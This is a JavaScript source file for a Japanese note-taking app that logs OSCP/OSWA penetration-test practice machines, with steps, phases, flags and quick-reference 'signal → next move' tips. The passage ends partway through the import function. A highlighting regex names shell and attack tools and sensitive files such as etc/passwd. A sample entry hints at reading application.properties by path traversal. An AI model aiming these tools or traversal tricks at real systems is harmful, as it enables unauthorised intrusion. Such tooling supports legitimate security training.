/* ═══════════════════════════════════════════════════════
   go2 cheatsheet — attacklog.js  (攻略ログ = 旧 logbook + web を一本化)
   Data: data.attackLogs[], data.phases[], data.payloads[], data.vulnTypes[]

   attackLog { id, cert("OSCP"|"OSWA"), name, ip, os, tags[], status,
               summary, localTxt, proofTxt, notes, ts,
               steps[], drawers[] }
   step   { id, phase, command, output, aim, learning, ts }
   drawer { id, signal, action, ref }        ← 兆候 → 次の一手（試験の引き出し）
   phase  { id, label, color }               ← data.phases を共有（recon/enum/…）

   ペイロード集・脆弱性タイプ編集は旧 web.js から移植（payload モードで使用）。
   app.js の共通関数（openModal/toast/esc/escAttr/uid/val/copyCell/
   copyToClipboard/emptyState/closeModal）を再利用。
════════════════════════════════════════════════════════ */

/* ── 定数 ── */
/* 資格タブ（自由編集可・data.attackCerts に保存） */
function alCerts() { return (Array.isArray(data.attackCerts) && data.attackCerts.length) ? data.attackCerts : ["OSCP", "OSWA"]; }
const AL_STATUS = {
  todo:   { label: "未着手",  color: "#7d9186", cls: "todo" },
  prog:   { label: "進行中",  color: "#e0a944", cls: "prog" },
  rooted: { label: "ROOTED",  color: "#3fd07f", cls: "rooted" },
};

/* ── ヘルパ ── */
function alLog()          { return data.attackLogs.find(l => l.id === alLogId); }
function alStatusMeta(s)  { return AL_STATUS[s] || AL_STATUS.todo; }
function alPhase(id)      { return data.phases.find(p => p.id === id); }
function alPhaseColor(id) { const p = alPhase(id); return p ? p.color : "#7d9186"; }
function alPhaseLabel(id) { if (!id) return "未分類"; const p = alPhase(id); return p ? p.label : id; }
function alLogsForCert()  { return data.attackLogs.filter(l => l.cert === alCert); }
function alDrawerCount()  { return data.attackLogs.reduce((n, l) => n + (l.drawers || []).length, 0); }

/* コマンドの簡易ハイライト */
function alHl(cmd) {
  let h = esc(cmd);
  h = h.replace(/^(#.*)$/gm, '<span class="al-comment">$1</span>');
  h = h.replace(/\b(nmap|gobuster|wfuzz|ffuf|curl|sqlmap|hydra|nc|ncat|python3?|java|javac|EXEC|xp_cmdshell|sp_configure|RECONFIGURE|SELECT|INSERT|UNION|POST|GET|PUT)\b/g, '<span class="al-kw">$1</span>');
  h = h.replace(/(\.\.\/[^\s'"<]*|win\.ini|application\.properties|etc\/passwd|proof\.txt|local\.txt)/g, '<span class="al-hl">$1</span>');
  return h;
}

/* ═══════════════════════════════════════════════════
   共通サイドナビ
════════════════════════════════════════════════════ */
function alRenderNav(active) {
  const nav = document.getElementById("navList");
  if (!nav) return;
  const item = (mode, icon, label, count, on) => `
    <button class="nav-item ${on ? 'active' : ''}" onclick="${mode}">
      <span class="material-symbols-rounded nav-icon">${icon}</span>
      <span class="nav-label">${label}</span>
      ${count != null ? `<span class="nav-count">${count}</span>` : ""}
    </button>`;
  nav.innerHTML =
    item("alGoLogs()",   "terminal", "攻略ログ",   data.attackLogs.length, appMode==="attacklog" && alView!=="drawer") +
    item("alGoDrawer()", "bolt",     "引き出し",   alDrawerCount(),        appMode==="attacklog" && alView==="drawer") +
    item("setMode('payload')", "vaccines", "ペイロード", data.payloads.length, appMode==="payload") +
    `<button class="nav-item" onclick="webEditVulnTypes()">
      <span class="material-symbols-rounded nav-icon">tune</span>
      <span class="nav-label">脆弱性タイプ編集</span>
    </button>`;
}

function alGoLogs()   { alView = "list";  alLogId = null; render(); }
function alGoDrawer() { alView = "drawer"; render(); }

/* ═══════════════════════════════════════════════════
   ルーター
════════════════════════════════════════════════════ */
function renderAttackLog() {
  if (alView === "drawer") { alRenderDrawer(); return; }
  if (alView === "log" && alLog()) { alRenderDetail(); return; }
  alView = "list";
  alRenderList();
}

/* ═══════════════════════════════════════════════════
   攻略ログ一覧（OSCP / OSWA タブ）
════════════════════════════════════════════════════ */
function alSetCert(c) { alCert = c; alView = "list"; alLogId = null; render(); }

function alRenderList() {
  alRenderNav();
  const main = document.getElementById("main");
  if (!alCerts().includes(alCert)) alCert = alCerts()[0];
  const logs = alLogsForCert();

  const certTabs = alCerts().map(c => {
    const n = data.attackLogs.filter(l => l.cert === c).length;
    return `<button class="tool-cert-tab ${alCert===c?'on':''}" onclick="alSetCert('${escAttr(c)}')">${esc(c)} <span class="badge">${n}</span></button>`;
  }).join("")
    + `<button class="tool-cert-tab cert-add" onclick="alAddCert()" title="タブを追加"><span class="material-symbols-rounded" style="font-size:16px">add</span></button>`
    + `<button class="tool-cert-tab cert-edit" onclick="alEditCerts()" title="タブを編集"><span class="material-symbols-rounded" style="font-size:15px">tune</span></button>`;

  const rooted = logs.filter(l => l.status === "rooted").length;
  const prog   = logs.filter(l => l.status === "prog").length;

  const cards = logs.map(l => {
    const st = alStatusMeta(l.status);
    const tags = (l.tags || []).slice(0, 5).map(t => `<span class="al-tag">${esc(t)}</span>`).join("") || `<span class="al-tag">—</span>`;
    return `
      <div class="al-card" onclick="alOpen('${l.id}')">
        <div class="al-card-top">
          <span class="al-status ${st.cls}">${st.label}</span>
          <span class="al-card-cert">${esc(l.cert)}</span>
          <button class="al-card-del" onclick="event.stopPropagation();alDelLog('${l.id}')" title="このログを削除"><span class="material-symbols-rounded">delete</span></button>
        </div>
        <h3 class="al-card-name">${esc(l.name)}</h3>
        ${l.ip ? `<div class="al-card-ip">${esc(l.ip)}</div>` : ""}
        ${l.summary ? `<div class="al-card-sum">${esc(l.summary)}</div>` : ""}
        <div class="al-card-tags">${tags}</div>
        <div class="al-card-foot">
          <span><b>${l.steps.length}</b> ステップ</span>
          <span><b>${(l.drawers||[]).length}</b> 引き出し</span>
          ${l.proofTxt ? `<span class="al-flag-got">🚩 proof</span>` : ""}
        </div>
      </div>`;
  }).join("");

  main.innerHTML = `
    <div class="s-head">
      <h1>攻略ログ</h1>
      <span class="th-count">${alCert} · ${logs.length} 件 · ROOTED ${rooted} · 進行中 ${prog}</span>
      <button class="th-import-btn" onclick="alImport()"><span class="material-symbols-rounded">data_object</span>JSONで取り込み</button>
      <button class="th-add" onclick="alAddLog()"><span class="material-symbols-rounded">add</span>ログを追加</button>
    </div>
    <div class="tool-cert-tabs">${certTabs}</div>
    ${logs.length ? `<div class="al-grid">${cards}</div>`
      : emptyState("terminal", `${alCert} の攻略ログがまだありません`,
          "「ログを追加」または「JSONで取り込み」で登録できます")}
  `;
}

function alOpen(id) { alLogId = id; alView = "log"; alPhaseFilter = null; alInputPhase = null; render(); document.getElementById("main").scrollTop = 0; }

/* ═══════════════════════════════════════════════════
   攻略ログ詳細（logbook 式のステップ記録）
════════════════════════════════════════════════════ */
function alRenderDetail() {
  alRenderNav();
  const main = document.getElementById("main");
  const l = alLog();
  if (!l) { alView = "list"; alRenderList(); return; }
  const st = alStatusMeta(l.status);

  const curP = alInputPhase || data.phases[0]?.id || "";

  // フェーズ別カウント（フィルタ用）
  const counts = {};
  l.steps.forEach(s => counts[s.phase || "__none"] = (counts[s.phase || "__none"] || 0) + 1);
  const phaseTabs = data.phases.map(p => `
    <button class="th-vchip ${alPhaseFilter===p.id?'on':''}" onclick="alSetPhaseFilter('${p.id}')" style="${alPhaseFilter===p.id?`border-color:${p.color};color:${p.color}`:''}">${esc(p.label)} <span class="cnt">${counts[p.id]||0}</span></button>`).join("");
  const noneCount = counts["__none"] || 0;
  const noneTab = noneCount ? `<button class="th-vchip ${alPhaseFilter==='__none'?'on':''}" onclick="alSetPhaseFilter('__none')">未分類 <span class="cnt">${noneCount}</span></button>` : "";

  // 記入フォームのフェーズ選択チップ（クリックで選択・再描画なし）
  const composerPhases = data.phases.map(p =>
    `<button class="al-cphase ${curP===p.id?'on':''}" data-ph="${p.id}" onclick="alPickComposerPhase('${p.id}')" style="--pc:${p.color}">${esc(p.label)}</button>`).join("");

  // ステップ一覧
  let items = l.steps.map((x, i) => ({ x, i }));
  if (alPhaseFilter === "__none") items = items.filter(o => !o.x.phase);
  else if (alPhaseFilter) items = items.filter(o => o.x.phase === alPhaseFilter);

  const timeline = items.length ? items.map(({ x, i }) => {
    const c = alPhaseColor(x.phase);
    return `
      <div class="al-step">
        <div class="al-step-side">
          <span class="al-phase-badge" style="background:${c}22;color:${c}">${esc(alPhaseLabel(x.phase))}</span>
          <span class="al-step-idx">#${i+1}</span>
        </div>
        <div class="al-step-body">
          <div class="al-cmd">${alHl(x.command) || "<span style='color:var(--md-on-surface-var)'>（コマンドなし）</span>"}
            <button class="al-copy" onclick="copyToClipboard(${escAttr(JSON.stringify(x.command))});toast('📋 コピーしました')" title="コピー"><span class="material-symbols-rounded">content_copy</span></button>
          </div>
          ${x.output ? `<div class="al-output">${esc(x.output)}</div>` : ""}
          ${x.aim ? `<div class="al-line aim"><span class="material-symbols-rounded ic">target</span><span>${esc(x.aim)}</span></div>` : ""}
          ${x.learning && x.learning !== "—" ? `<div class="al-line learn"><span class="material-symbols-rounded ic">lightbulb</span><span>${esc(x.learning)}</span></div>` : ""}
          <div class="al-step-acts">
            <button class="al-act-btn edit" onclick="alEditStep(${i})"><span class="material-symbols-rounded">edit</span>編集</button>
            <button class="al-act-btn" onclick="alStepToDrawer(${i})"><span class="material-symbols-rounded">bolt</span>引き出しに追加</button>
            <button class="al-act-ico" onclick="alMoveStep(${i},-1)" title="上へ" ${i===0?'disabled':''}><span class="material-symbols-rounded">arrow_upward</span></button>
            <button class="al-act-ico" onclick="alMoveStep(${i},1)" title="下へ" ${i===l.steps.length-1?'disabled':''}><span class="material-symbols-rounded">arrow_downward</span></button>
            <button class="al-act-ico danger" onclick="alDelStep(${i})" title="削除"><span class="material-symbols-rounded">delete</span></button>
          </div>
        </div>
      </div>`;
  }).join("") : `<div class="al-empty-steps"><span class="material-symbols-rounded">edit_note</span>まだステップがありません。<b>上の「ステップを記録」</b>から追加します。</div>`;

  main.innerHTML = `
    <div class="al-td">
      <div class="al-td-main">
        <div class="th-crumb"><button onclick="alGoLogs()">攻略ログ</button> / <b>${esc(l.name)}</b></div>
        <div class="al-td-title"><h1>${esc(l.name)}</h1>
          <span class="al-status ${st.cls}">${st.label}</span>
          <span class="al-card-cert">${esc(l.cert)}</span></div>
        <div class="al-td-meta">
          <span>IP: <b>${esc(l.ip)||"—"}</b></span>
          <span>OS: <b>${esc(l.os)||"—"}</b></span>
        </div>

        <div class="al-summary">
          <span class="al-summary-lbl">キルチェーン要約 (TL;DR)</span>
          <button class="al-summary-edit" onclick="alEditSummary()" title="要約を編集"><span class="material-symbols-rounded">edit</span></button>
          <div class="al-summary-text">${esc(l.summary) || "（未記入）右上の鉛筆から書けます"}</div>
        </div>

        <!-- ステップ記入フォーム（常時表示・矢印不要） -->
        <div class="al-composer">
          <div class="al-composer-head">
            <span class="al-composer-title"><span class="material-symbols-rounded">add_circle</span>ステップを記録</span>
            <span class="al-composer-sub">フェーズを選んで記入 → 追加</span>
          </div>
          <div class="al-composer-phases" id="alComposerPhases">${composerPhases}</div>
          <textarea id="alCmpCmd" class="al-cmp-cmd" rows="2" placeholder="コマンド / 生HTTPリクエストを貼り付け（Ctrl+Enter で追加）" onkeydown="if((event.ctrlKey||event.metaKey)&&event.key==='Enter')alComposerAdd()"></textarea>
          <div class="al-cmp-grid">
            <input id="alCmpAim" class="al-cmp-in" placeholder="🎯 狙い・理由（なぜこの一手か）">
            <input id="alCmpLearn" class="al-cmp-in" placeholder="💡 学び（次に活かす気づき）">
          </div>
          <textarea id="alCmpOut" class="al-cmp-out" rows="1" placeholder="出力・レスポンス（任意）"></textarea>
          <div class="al-cmp-actions">
            <button class="al-cmp-add" onclick="alComposerAdd()"><span class="material-symbols-rounded">add</span>ステップを追加</button>
          </div>
        </div>

        <div class="al-steps-head">
          <span class="al-steps-title">記録（${l.steps.length}）</span>
          <div class="th-vchips">
            <button class="th-vchip ${!alPhaseFilter?'on':''}" onclick="alSetPhaseFilter(null)">すべて</button>
            ${phaseTabs}${noneTab}
            <button class="al-phase-edit" onclick="alEditPhases()"><span class="material-symbols-rounded" style="font-size:15px">tune</span>フェーズ編集</button>
          </div>
        </div>

        <div class="al-steps">${timeline}</div>
      </div>
      <div class="al-td-side">
        <div class="th-side-sec"><h4>ログ情報</h4>
          <div class="th-kv"><span class="k">資格</span><span class="v">${esc(l.cert)}</span></div>
          <div class="th-kv"><span class="k">IP</span><span class="v">${esc(l.ip)||"—"}</span></div>
          <div class="th-kv"><span class="k">OS</span><span class="v">${esc((l.os))||"—"}</span></div>
          <div class="th-kv"><span class="k">状態</span><span class="v" style="color:${st.color}">${st.label}</span></div>
          <div class="th-kv"><span class="k">ステップ</span><span class="v">${l.steps.length}</span></div>
          <button class="al-side-btn" onclick="alEditMeta()"><span class="material-symbols-rounded" style="font-size:15px">edit</span>情報を編集</button>
          <button class="al-side-btn danger" onclick="alDelLog('${l.id}')"><span class="material-symbols-rounded" style="font-size:15px">delete</span>このログを削除</button>
        </div>
        <div class="th-side-sec"><h4>フラグ (local / proof)</h4>
          <div class="al-flag ${l.localTxt?'got':''}"><span class="lbl">🚩 local</span><span class="val">${esc(l.localTxt)||"未取得"}</span></div>
          <div class="al-flag ${l.proofTxt?'got':''}"><span class="lbl">🚩 proof</span><span class="val">${esc(l.proofTxt)||"未取得"}</span></div>
        </div>
        <div class="th-side-sec"><h4>引き出し（この攻略）</h4>
          <div class="al-side-drawers">${(l.drawers||[]).length ? (l.drawers||[]).map((d,di)=>`<div class="al-side-drawer"><span class="sig">${esc(d.signal)||"（兆候未記入）"}</span><button class="al-side-drawer-del" onclick="alDelDrawer(${di})" title="削除"><span class="material-symbols-rounded" style="font-size:13px">close</span></button></div>`).join("") : "<span style='color:var(--md-on-surface-var);font-size:12px'>各ステップの「引き出しに追加」で登録</span>"}</div>
        </div>
      </div>
    </div>
  `;
}

/* ── フィルタ / 記入フォーム ── */
function alSetPhaseFilter(id) { alPhaseFilter = id; alRenderDetail(); }

/* フォームのフェーズ選択：再描画せずチップの見た目だけ更新（入力保持のため） */
function alPickComposerPhase(id) {
  alInputPhase = id;
  document.querySelectorAll("#alComposerPhases .al-cphase").forEach(b => b.classList.toggle("on", b.dataset.ph === id));
}

/* 記入フォームから1ステップ追加 */
function alComposerAdd() {
  const l = alLog(); if (!l) return;
  const cmd   = (document.getElementById("alCmpCmd")?.value   || "").trim();
  const aim   = (document.getElementById("alCmpAim")?.value   || "").trim();
  const learn = (document.getElementById("alCmpLearn")?.value || "").trim();
  const out   = (document.getElementById("alCmpOut")?.value   || "").trim();
  if (!cmd && !aim && !out) { toast("コマンドか狙いを入力してください"); return; }
  const phase = alInputPhase || data.phases[0]?.id || "";
  l.steps.push({ id: uid(), phase, command: cmd, output: out, aim, learning: learn, ts: Date.now() });
  if (l.status === "todo") l.status = "prog";
  alRenderDetail();
  setTimeout(() => document.getElementById("alCmpCmd")?.focus(), 30);
}

/* 要約(TL;DR)だけを手早く編集 */
function alEditSummary() {
  const l = alLog(); if (!l) return;
  openModal("キルチェーン要約 (TL;DR) を編集",
    `<label>要約</label><textarea id="alSumOnly" style="min-height:120px" placeholder="全体の流れを1〜数行で">${esc(l.summary)}</textarea>`,
    () => { l.summary = val("alSumOnly"); alRenderDetail(); toast("✅ 更新しました"); });
}

function alEditStep(i) {
  const l = alLog(); const x = l.steps[i]; if (!x) return;
  const opts = data.phases.map(p => `<option value="${p.id}" ${x.phase===p.id?'selected':''}>[${esc(p.label)}]</option>`).join("") + `<option value="" ${!x.phase?'selected':''}>（未分類）</option>`;
  openModal("ステップを編集",
    `<label>フェーズ</label><select id="alPhase">${opts}</select>
     <label>コマンド / 生HTTPリクエスト</label><textarea id="alCmd">${esc(x.command)}</textarea>
     <label>出力（任意）</label><textarea id="alOut">${esc(x.output)}</textarea>
     <label>狙い・理由（→）</label><input id="alAim" value="${esc(x.aim)}" placeholder="なぜこの一手を選んだか">
     <label>学び（⇒）</label><input id="alLearn" value="${esc(x.learning)}" placeholder="次に活かせる気づき">`,
    () => {
      x.phase = val("alPhase"); x.command = val("alCmd"); x.output = val("alOut");
      x.aim = val("alAim"); x.learning = val("alLearn");
      alRenderDetail(); toast("✅ 更新しました");
    });
}
function alDelStep(i) {
  const l = alLog(); if (!l.steps[i]) return;
  if (!confirm("このステップを削除しますか？")) return;
  l.steps.splice(i, 1); alRenderDetail();
}
function alMoveStep(i, d) {
  const l = alLog(); const j = i + d;
  if (j < 0 || j >= l.steps.length) return;
  [l.steps[i], l.steps[j]] = [l.steps[j], l.steps[i]];
  alRenderDetail();
}

/* ── ステップ → 引き出し（兆候→次の一手）へ昇格 ── */
function alStepToDrawer(i) {
  const l = alLog(); const x = l.steps[i]; if (!x) return;
  l.drawers = l.drawers || [];
  openModal("引き出しに追加（兆候 → 次の一手）",
    `<label>兆候 (signal) — 何を見たら</label>
     <input id="alSig" value="${esc(x.output || x.aim || "")}" placeholder="例: Whitelabel Error Page が出る">
     <label>次の一手 (action) — 何をするか</label>
     <textarea id="alAct" placeholder="例: Spring Boot と判定し application.properties を traversal で狙う">${esc(x.aim ? x.command : x.command)}</textarea>
     <p class="al-modal-note">試験中に「兆候」で検索して即座に「次の一手」を引きます。</p>`,
    () => {
      const sig = val("alSig").trim(), act = val("alAct").trim();
      if (!sig && !act) { toast("兆候か一手を入力してください"); return; }
      l.drawers.push({ id: uid(), signal: sig, action: act, ref: l.name });
      alRenderDetail(); toast("⚡ 引き出しに追加しました");
    });
}
function alDelDrawer(di) {
  const l = alLog(); if (!(l.drawers||[])[di]) return;
  l.drawers.splice(di, 1); alRenderDetail();
}

/* ── メタ編集 / 追加 ── */
function alEditMeta() {
  const l = alLog(); if (!l) return;
  const certOpts = alCerts().map(c => `<option value="${c}" ${l.cert===c?'selected':''}>${c}</option>`).join("");
  const statOpts = Object.keys(AL_STATUS).map(k => `<option value="${k}" ${l.status===k?'selected':''}>${AL_STATUS[k].label}</option>`).join("");
  openModal("ログ情報を編集",
    `<label>名前</label><input id="alName" value="${esc(l.name)}">
     <label>資格</label><select id="alCertSel">${certOpts}</select>
     <label>IP</label><input id="alIp" value="${esc(l.ip)}">
     <label>OS / スタック</label><input id="alOs" value="${esc(l.os)}">
     <label>タグ（スペース区切り）</label><input id="alTags" value="${esc((l.tags||[]).join(' '))}">
     <label>状態</label><select id="alStat">${statOpts}</select>
     <label>local.txt</label><input id="alLocal" value="${esc(l.localTxt)}">
     <label>proof.txt</label><input id="alProof" value="${esc(l.proofTxt)}">
     <label>キルチェーン要約 (TL;DR)</label><textarea id="alSum">${esc(l.summary)}</textarea>`,
    () => {
      l.name = val("alName") || "無名ターゲット"; l.cert = val("alCertSel") || "OSCP";
      l.ip = val("alIp"); l.os = val("alOs");
      l.tags = val("alTags").split(/\s+/).filter(Boolean);
      l.status = val("alStat"); l.localTxt = val("alLocal"); l.proofTxt = val("alProof");
      l.summary = val("alSum");
      alRenderDetail(); toast("✅ 更新しました");
    });
}
function alAddLog() {
  const certOpts = alCerts().map(c => `<option value="${c}" ${alCert===c?'selected':''}>${c}</option>`).join("");
  openModal("ログを追加",
    `<label>名前</label><input id="alName" placeholder="例: Target 2">
     <label>資格</label><select id="alCertSel">${certOpts}</select>
     <label>IP</label><input id="alIp" placeholder="192.168.x.x">
     <label>OS / スタック</label><input id="alOs" placeholder="Windows / Linux / PHP …">`,
    () => {
      const l = {
        id: uid(), cert: val("alCertSel") || alCert,
        name: val("alName") || "無名ターゲット", ip: val("alIp"), os: val("alOs"),
        status: "prog", tags: [], summary: "", localTxt: "", proofTxt: "", notes: "",
        steps: [], drawers: [], ts: Date.now(),
      };
      data.attackLogs.push(l);
      alCert = l.cert; alOpen(l.id);
      toast("✅ ログを追加しました");
    });
}
function alDelLog(id) {
  const l = data.attackLogs.find(x => x.id === id); if (!l) return;
  if (!confirm(`「${l.name}」を削除しますか？`)) return;
  data.attackLogs = data.attackLogs.filter(x => x.id !== id);
  alGoLogs(); toast("🗑 削除しました");
}

/* ── 資格タブの管理（追加・改名・並べ替え・削除） ── */
function alAddCert() {
  openModal("タブを追加",
    `<label>タブ名（資格・カテゴリ）</label><input id="alNewCert" placeholder="例: OSEP / PNPT / HTB / 練習">
     <p class="al-modal-note">攻略ログを分類するタブを追加します。OSCP / OSWA 以外も自由に作れます。</p>`,
    () => {
      const name = (val("alNewCert") || "").trim();
      if (!name) { toast("名前を入力してください"); return; }
      if (data.attackCerts.includes(name)) { alCert = name; render(); toast("既に存在するタブに切り替えました"); return; }
      data.attackCerts.push(name); alCert = name; alView = "list"; render();
      toast(`✅ タブ「${name}」を追加しました`);
    }, { okText: "追加" });
}
function alEditCerts() {
  const rows = data.attackCerts.map((c, i) => {
    const cnt = data.attackLogs.filter(l => l.cert === c).length;
    return `<div class="web-vtedit-row">
      <span class="web-vt-name" style="flex:1">${esc(c)}</span>
      <span class="web-vt-cnt">${cnt} 件</span>
      <button class="web-vt-act" onclick="alRenameCert('${escAttr(c)}')">改名</button>
      <button class="web-vt-act" onclick="alMoveCert('${escAttr(c)}',-1)" ${i===0?'disabled':''}>↑</button>
      <button class="web-vt-act" onclick="alMoveCert('${escAttr(c)}',1)" ${i===data.attackCerts.length-1?'disabled':''}>↓</button>
      <button class="web-vt-act danger" onclick="alDelCert('${escAttr(c)}')">削除</button>
    </div>`;
  }).join("");
  openModal("タブを編集",
    `<div class="web-vtedit-list">${rows}</div>
     <button class="web-vt-add" onclick="alAddCert()"><span class="material-symbols-rounded" style="font-size:16px">add</span>タブを追加</button>
     <p class="web-vtedit-note">改名するとそのタブのログもまとめて移動します。ログのあるタブを削除すると、ログは先頭のタブへ移動します。</p>`,
    null, { okText: "閉じる", onOk: () => { closeModal(); if (appMode === "attacklog") render(); } });
}
function alRenameCert(oldName) {
  const name = (prompt("新しいタブ名", oldName) || "").trim();
  if (!name || name === oldName) return;
  if (data.attackCerts.includes(name)) { toast("同名のタブが既にあります"); return; }
  const i = data.attackCerts.indexOf(oldName); if (i < 0) return;
  data.attackCerts[i] = name;
  data.attackLogs.forEach(l => { if (l.cert === oldName) l.cert = name; });
  if (alCert === oldName) alCert = name;
  alEditCerts();
}
function alMoveCert(name, dir) {
  const i = data.attackCerts.indexOf(name); const j = i + dir;
  if (i < 0 || j < 0 || j >= data.attackCerts.length) return;
  [data.attackCerts[i], data.attackCerts[j]] = [data.attackCerts[j], data.attackCerts[i]];
  alEditCerts();
}
function alDelCert(name) {
  if (data.attackCerts.length <= 1) { toast("最低1つのタブが必要です"); return; }
  const cnt = data.attackLogs.filter(l => l.cert === name).length;
  const dest = data.attackCerts.find(c => c !== name);
  const msg = cnt > 0 ? `「${name}」を削除します。${cnt}件のログは「${dest}」へ移動します。よろしいですか？`
                      : `タブ「${name}」を削除しますか？`;
  if (!confirm(msg)) return;
  data.attackLogs.forEach(l => { if (l.cert === name) l.cert = dest; });
  data.attackCerts = data.attackCerts.filter(c => c !== name);
  if (alCert === name) alCert = data.attackCerts[0];
  alEditCerts();
}

/* ═══════════════════════════════════════════════════
   引き出し（兆候 → 次の一手）— 全ログ横断・検索
════════════════════════════════════════════════════ */
function alRenderDrawer() {
  alRenderNav();
  const main = document.getElementById("main");
  const q = (alDrawerQuery || "").toLowerCase();

  const all = [];
  data.attackLogs.forEach(l => (l.drawers || []).forEach((d, di) => all.push({ ...d, src: l.name, cert: l.cert, logId: l.id, di })));
  let list = all;
  if (q) list = all.filter(d => (d.signal + " " + d.action + " " + d.src).toLowerCase().includes(q));

  const cards = list.map(d => `
    <div class="al-drawer-card">
      <div class="al-dc-left">
        <div class="al-dc-signal"><span class="material-symbols-rounded">sensors</span><span>${esc(d.signal)||"（兆候未記入）"}</span></div>
        <span class="al-dc-src" onclick="alOpen('${d.logId}')">from ${esc(d.src)} · ${esc(d.cert)}</span>
      </div>
      <div class="al-dc-arrow"><span class="material-symbols-rounded">arrow_forward</span></div>
      <div class="al-dc-action">${alHl(d.action)}
        <button class="al-copy inline" onclick="copyToClipboard(${escAttr(JSON.stringify(d.action))});toast('📋 コピーしました')" title="コピー"><span class="material-symbols-rounded">content_copy</span></button>
      </div>
    </div>`).join("");

  main.innerHTML = `
    <div class="s-head">
      <h1>引き出し</h1>
      <span class="th-count">${list.length} / ${all.length} 件</span>
    </div>
    <div class="al-drawer-hero"><b>兆候 → 次の一手。</b>試験中は上の検索バー、または下の一覧から「見えている状況」を引いて次の手を即座に確認します。各攻略ログのステップの<b>「引き出しに追加」</b>で蓄積されます。</div>
    ${list.length ? `<div class="al-drawer-list">${cards}</div>`
      : emptyState("bolt", q ? "一致する引き出しがありません" : "まだ引き出しがありません",
          q ? "別のキーワードでお試しください" : "攻略ログのステップから「引き出しに追加」で登録")}
  `;
}

/* 検索バー（ヘッダ）からの呼び出し */
function renderAttackLogSearch() {
  const q = document.getElementById("searchInput").value.trim();
  if (!q) { searchMode = false; render(); return; }
  // 攻略ログでは検索＝引き出しの絞り込みに直結（試験中の即引き）
  alDrawerQuery = q;
  alView = "drawer";
  searchMode = false;   // 引き出しビュー自体で結果を出すのでsearchModeは使わない
  render();
}

/* ═══════════════════════════════════════════════════
   フェーズ編集（data.phases を共有）
════════════════════════════════════════════════════ */
function alEditPhases() {
  const rows = data.phases.map((p, i) => {
    const cnt = data.attackLogs.reduce((a, l) => a + l.steps.filter(s => s.phase === p.id).length, 0);
    return `<div class="web-vtedit-row">
      <span class="web-vt-swatch" style="background:${p.color}"></span>
      <span class="web-vt-name">${esc(p.label)}</span>
      <span class="web-vt-cnt">${cnt} 件</span>
      <button class="web-vt-act" onclick="alPhaseRename('${p.id}')">名前</button>
      <button class="web-vt-act" onclick="alPhaseColor('${p.id}')">色</button>
      <button class="web-vt-act" onclick="alPhaseMove('${p.id}',-1)" ${i===0?'disabled':''}>↑</button>
      <button class="web-vt-act" onclick="alPhaseMove('${p.id}',1)" ${i===data.phases.length-1?'disabled':''}>↓</button>
      <button class="web-vt-act danger" onclick="alPhaseDelete('${p.id}')">削除</button>
    </div>`;
  }).join("");
  openModal("フェーズを編集",
    `<div class="web-vtedit-list">${rows}</div>
     <button class="web-vt-add" onclick="alPhaseAdd()"><span class="material-symbols-rounded" style="font-size:16px">add</span>フェーズを追加</button>
     <p class="web-vtedit-note">recon / enum / foothold / privesc / loot を基本にしています。OSWA用に mapping / vuln / exploit / flag 等へ変えても構いません。削除してもステップは残ります（未分類になります）。</p>`,
    null, { okText: "閉じる", onOk: () => { closeModal(); if (appMode === "attacklog") render(); } });
}
function alPhaseAdd() {
  const color = VT_PALETTE[data.phases.length % VT_PALETTE.length];
  data.phases.push({ id: uid(), label: "新フェーズ", color });
  alEditPhases();
}
function alPhaseRename(id) {
  const p = alPhase(id); if (!p) return;
  const name = prompt("フェーズ名", p.label);
  if (name && name.trim()) { p.label = name.trim(); alEditPhases(); }
}
function alPhaseColor(id) {
  const p = alPhase(id); if (!p) return;
  const cur = VT_PALETTE.indexOf(p.color);
  p.color = VT_PALETTE[(cur + 1) % VT_PALETTE.length];
  alEditPhases();
}
function alPhaseMove(id, dir) {
  const i = data.phases.findIndex(p => p.id === id);
  const j = i + dir;
  if (i < 0 || j < 0 || j >= data.phases.length) return;
  [data.phases[i], data.phases[j]] = [data.phases[j], data.phases[i]];
  alEditPhases();
}
function alPhaseDelete(id) {
  const p = alPhase(id); if (!p) return;
  if (!confirm(`フェーズ「${p.label}」を削除しますか？（ステップは残ります）`)) return;
  data.phases = data.phases.filter(x => x.id !== id);
  alEditPhases();
}


/* ═══════════════════════════════════════════════════
   JSON インポート
   ワークフロー: md でまとめた内容を Claude に渡す → Claude が
   下記スキーマの JSON を出力 → ここに貼り付けて取り込む。
   受け付ける形: 単体オブジェクト / 配列 / {"attackLogs":[…]}。
   step   { phase, command, output, aim, learning }
   drawer { signal, action }
════════════════════════════════════════════════════ */
const AL_IMPORT_SAMPLE = `{
  "cert": "OSWA",
  "name": "ASIO",
  "ip": "192.168.228.131",
  "os": "Windows Server 2019",
  "status": "rooted",
  "tags": ["Spring Boot", "SQLi", "xp_cmdshell"],
  "summary": "Whitelabel → Spring Boot → traversal → … → proof.txt",
  "localTxt": "de3d9e…",
  "proofTxt": "1a79f9…",
  "steps": [
    { "phase": "recon", "command": "nmap asio", "output": "80/3389/5986", "aim": "ポート把握", "learning": "Windowsと推測" }
  ],
  "drawers": [
    { "signal": "Whitelabel Error Page", "action": "Spring Boot と判定し application.properties を traversal で狙う" }
  ]
}`;

/* JSON 1件を正規化して attackLog 化 */
function alCoerceLog(o) {
  if (!o || typeof o !== "object") return null;
  const phaseIds = new Set(data.phases.map(p => p.id));
  const cert = (typeof o.cert === "string" && o.cert.trim()) ? o.cert.trim() : (alCerts()[0] || "OSCP");
  const validStatus = { todo: 1, prog: 1, rooted: 1 };
  const steps = Array.isArray(o.steps) ? o.steps.map(s => ({
    id: uid(),
    phase: phaseIds.has(s && s.phase) ? s.phase : "",
    command: String((s && s.command) || ""),
    output: String((s && s.output) || ""),
    aim: String((s && (s.aim ?? s.note)) || ""),
    learning: String((s && s.learning) || ""),
    ts: Date.now(),
  })) : [];
  const drawers = Array.isArray(o.drawers) ? o.drawers.map(d => ({
    id: uid(),
    signal: String((d && d.signal) || ""),
    action: String((d && d.action) || ""),
    ref: String(o.name || ""),
  })) : [];
  return {
    id: uid(), cert,
    name: String(o.name || "取り込んだ攻略ログ"),
    ip: String(o.ip || ""), os: String(o.os || ""),
    status: validStatus[o.status] ? o.status : (o.proofTxt ? "rooted" : "prog"),
    tags: Array.isArray(o.tags) ? o.tags.map(String) : [],
    summary: String(o.summary || ""),
    localTxt: String(o.localTxt || ""), proofTxt: String(o.proofTxt || ""),
    notes: String(o.notes || ""),
    steps, drawers, ts: Date.now(),
  };
}

function alImport() {
  openModal("JSON で取り込み",
    `<label>攻略ログ JSON を貼り付け</label>
     <textarea id="alImpJson" style="min-height:240px;font-family:var(--font-mono);font-size:12px" placeholder='${esc(AL_IMPORT_SAMPLE)}'></textarea>
